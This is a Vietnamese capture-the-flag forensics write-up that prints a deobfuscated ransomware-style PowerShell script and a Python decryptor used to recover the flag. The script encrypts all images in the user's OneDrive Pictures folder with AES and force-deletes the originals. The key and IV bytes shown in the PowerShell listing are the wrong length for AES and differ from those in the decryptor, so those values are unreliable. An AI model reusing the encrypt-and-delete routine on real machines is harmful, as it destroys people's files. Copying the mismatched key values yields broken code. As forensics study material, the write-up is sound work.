# _Powershell 101_ _(FORENSICS)_

![image](https://github.com/user-attachments/assets/79a16db8-500e-4172-b64c-2800d0111b0e)

## _Solution_

Tải về mình nhận được một tệp **pwsh101.zip**, giải nén ra thì có file **s.ps1** và 1 folder **Pictures** ( gồm tất cả các ảnh đã bị encrypt )

![image](https://github.com/user-attachments/assets/15b806ec-f56e-42fa-9406-5dbb36fea310)
![image](https://github.com/user-attachments/assets/2cb04a7d-9b6f-4464-aeb9-8b6b0d0f2cd9)

Mở file s.ps1 ra thì thấy có 1 đoạn base64

![image](https://github.com/user-attachments/assets/28592ee4-9b2d-43e9-99d6-991f4e554c7f)

Đem lên cyberchef decrypt thì nhận được 1 đoạn script PowerShell đã bị obfuscation

![image](https://github.com/user-attachments/assets/2ce95f93-57cf-4271-ae63-15897971abb3)

Đem đi làm đẹp lại cho dễ đọc hơn

```
# Define variables and types
Set-Variable -Name "gxqh" -Value ([Type]"System.Security.Cryptography.CipherMode")
$CipherPadding = [Type]"System.Security.Cryptography.PaddingMode"
$TextEncoding = [Type]"System.Text.Encoding"
Set-Variable -Name "lc3Zj8" -Value ([Type]"System.IO.Compression.CompressionMode")
Set-Variable -Name "arZ3" -Value ([Type]"System.Convert")
Set-Variable -Name "ulZ2" -Value ([Type]"System.IO.Path")
Set-Variable -Name "0Upe6" -Value ([Type]"System.Security.Principal.WindowsPrincipal")

# Encryption function
function Encrypt {
    param($InputFile, $OutputFile)

    # Create AES instance
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = $gxqh::CBC
    $aes.Padding = $CipherPadding::Zeros
    $aes.BlockSize = 128
    $aes.KeySize = 256

    # Set IV and Key
    $aes.IV = [byte[]](0x3F, 0x45, 0x2B, 0x4D, 0x62, 0x51, 0x65, 0x53, 0x68, 0x56, 0x6D, 0x59, 0x71)
    $aes.Key = [byte[]](0x61, 0x42, 0x4A, 0x40, 0x4E, 0x63, 0x52, 0x66, 0x55, 0x6A, 0x58, 0x21, 0x41, 0x25)

    # Create encryptor and read plaintext
    $encryptor = $aes.CreateEncryptor()
    $plainBytes = Get-Content -Path $InputFile -Encoding Byte

    # Encrypt plaintext
    $encryptedText = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
    $aes.Dispose()

    # Convert encrypted text to Base64
    $base64String = $arZ3::ToBase64String($encryptedText)
    $base64Bytes = $TextEncoding::UTF8.GetBytes($base64String)

    # Compress Base64 string
    $memoryStream = New-Object System.IO.MemoryStream
    $deflateStream = New-Object System.IO.Compression.DeflateStream($memoryStream, $lc3Zj8::Compress, $true)
    $deflateStream.Write($base64Bytes, 0, $base64Bytes.Length)
    $deflateStream.Flush()
    $deflateStream.Close()

    # Convert compressed data to Base64 and write to output
    $compressedData = $arZ3::ToBase64String($memoryStream.ToArray())
    Write-Output $compressedData | Out-File -FilePath $OutputFile
}

# Find image files in a specific directory
$CurrentUser = $0Upe6::GetCurrent().Name.Substring(16)
$ImagesDirectory = "C:\Users\$CurrentUser\OneDrive\Pictures"
$ImageFiles = Get-ChildItem -Path $ImagesDirectory -Recurse |
    Where-Object { $_.Extension -in '.jpg', '.png', '.jpeg', '.bmp' } |
    Select-Object -ExpandProperty FullName

# Process each image file
foreach ($file in $ImageFiles) {
    $ParentDirectory = (Get-Item $file).Directory.FullName
    $FileNameWithoutExtension = $ulZ2::GetFileNameWithoutExtension($file)
    $OutputFile = Join-Path -Path $ParentDirectory -ChildPath "$FileNameWithoutExtension.enc"

    # Encrypt the file
    Encrypt -InputFile $file -OutputFile $OutputFile

    # Remove original file
    Remove-Item -Force $file
}
```
Một đoạn script tương đối dài, nhưng mục tiêu chung là 

```
1. Mã hóa tập tin ảnh:

- Script tìm kiếm tất cả các tập tin hình ảnh (với các phần mở rộng như .jpg, .png, .jpeg, .bmp) trong thư mục OneDrive\Pictures của người dùng hiện tại.

- Mỗi tập tin hình ảnh được mã hóa bằng AES (Advanced Encryption Standard) trong chế độ CBC (Cipher Block Chaining) với padding Zeros và kích thước khóa 256-bit.

- Sau khi mã hóa, nội dung được nén bằng DeflateStream, sau đó chuyển thành chuỗi Base64 và lưu vào một tập tin mới với phần mở rộng .enc.

2. Xóa tập tin gốc:

- Sau khi mã hóa và lưu trữ, tập tin gốc sẽ bị xóa khỏi hệ thống.

```

Nhiệm vụ của mình giờ là **decrypt** -> **lấy lại tệp ảnh gốc** -> **flag** (**Decrypt** sẽ là làm ngược lại các thao tác khi **Encrypt**)

Và đây là số lượng file đã bị **encrypt**

![image](https://github.com/user-attachments/assets/8ac50783-b30c-4894-81c5-d19f4667ef90)


Mình có viết 1 script Python để thực hiện điều này

```
import base64
import io
import zlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def decrypt(input_file, output_file):

    # IV và Key từ PowerShell script
    iv = bytes([0x3f, 0x45, 0x28, 0x48, 0x2b, 0x4d, 0x62, 0x51, 0x65, 0x53, 0x68, 0x56, 0x6d, 0x59, 0x71, 0x33])
    key = bytes([0x43, 0x26, 0x46, 0x29, 0x4a, 0x40, 0x4e, 0x63, 0x52, 0x66, 0x55, 0x6a, 0x58, 0x6e, 0x32, 0x72, 0x34,
                 0x75, 0x37, 0x78, 0x21, 0x41, 0x25, 0x44, 0x2a, 0x47, 0x2d, 0x4b, 0x61, 0x50, 0x64, 0x53])

    # Đọc mã base64 nén từ tệp bị encrypt ở dạng nhị phân
    try:
      with open(input_file, 'rb') as f:
          compressed_data_b64 = f.read()
    except Exception as e:
      print(f"Error reading file: {e}")
      return
    
    # Giải mã dữ liệu base64 đã nén
    try:
        compressed_data = base64.b64decode(compressed_data_b64)
    except Exception as e:
        print(f"Error during initial base64 decoding: {e}")
        return

    # Giải nén data bằng zlib
    try:
        decompressed_data = zlib.decompress(compressed_data, wbits=-zlib.MAX_WBITS)
    except Exception as e:
        print(f"Error during decompression: {e}")
        return
    
    # Giải mã chuỗi base64
    try:
        base64_string = decompressed_data.decode('utf-8')
        encrypted_bytes = base64.b64decode(base64_string)
    except Exception as e:
        print(f"Error during secondary base64 decoding: {e}")
        return


    # Khởi tạo mật mã AES
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Giải mã và xóa padding(\x00)
    try:
        decrypted_bytes = cipher.decrypt(encrypted_bytes)
        # Remove padding 
        decrypted_bytes = decrypted_bytes.rstrip(b'\x00') 
    except ValueError as e:
        print(f"Error during decryption (possible padding error): {e}")
        return

    # Lưu data decrypt vào file mới
    with open(output_file, 'wb') as outfile:
        outfile.write(decrypted_bytes)

if __name__ == '__main__':
    # Example usage:
    encrypted_file = "E:\\Python\\gundam.enc"  # File đầu vào bị mã hóa
    decrypted_file = "1.txt" # File gốc

    decrypt(encrypted_file, decrypted_file)
    print(f"Decrypted data written to: {decrypted_file}")
```
Đoạn scrypt trên sẽ thực hiện

```
1. Giải mã Base64.

2. Giải nén dữ liệu (dùng zlib).

3. Giải mã AES.

4. Ghi kết quả vào tệp tin đích.
```
Mình sẽ thực hiện lần lượt với từng file bằng cách thêm file .enc vào hàm này

```
encrypted_file = "E:\\Python\\Important.enc" 
```
Và đã có kết quả ở file **Important.enc**

![3](https://github.com/user-attachments/assets/43586728-f106-40dc-9300-fe38f3079069)

```
Flag: KCSC{S0m3t1m3_R3co\_/ery_1s_EasieR_Th@n_y0u_Thought}
```
